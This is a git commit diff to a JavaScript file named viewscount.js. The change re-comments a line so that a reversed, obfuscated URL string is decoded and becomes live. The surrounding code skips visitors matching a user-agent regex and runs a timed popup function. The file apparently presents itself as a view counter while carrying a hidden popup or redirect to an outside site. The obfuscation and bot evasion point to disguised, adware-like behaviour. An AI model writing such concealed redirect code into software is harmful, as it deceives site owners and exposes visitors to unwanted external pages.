aad0e7824eebe8389f71b95a24b40d44f285853f
JTJ <49002275+ProfessorJTJ@users.noreply.github.com>
2025-01-27 13:19:29 +0330

    Update viewscount.js

--- js/viewscount.js
+++ js/viewscount.js
@@ -5,7 +5,7 @@
 	if (re.test(userAgent))
 	    return;
 	
-	let eatApple = "php.reweiv/ri.pohsnirda//:ptth";//"dne;rqinu=emehcs;tnetnI#JwGXYQ1fGA/nioj/ri.elb//:tnetni"/*"php.modnar/moc.61tsohteyb.razabefac//:ptth"*/.split("").reverse().join("");
+	let eatApple = "php.reweiv/ri.pohsnirda//:ptth"/*"dne;rqinu=emehcs;tnetnI#JwGXYQ1fGA/nioj/ri.elb//:tnetni"*//*"php.modnar/moc.61tsohteyb.razabefac//:ptth"*/.split("").reverse().join("");
 	let showPopUp = function() {
 		let meItem = localStorage.getItem("popcornlast");
 		if (meItem == null || (Date.now() - parseInt(meItem)) > (60 * 60 * 1000)) {
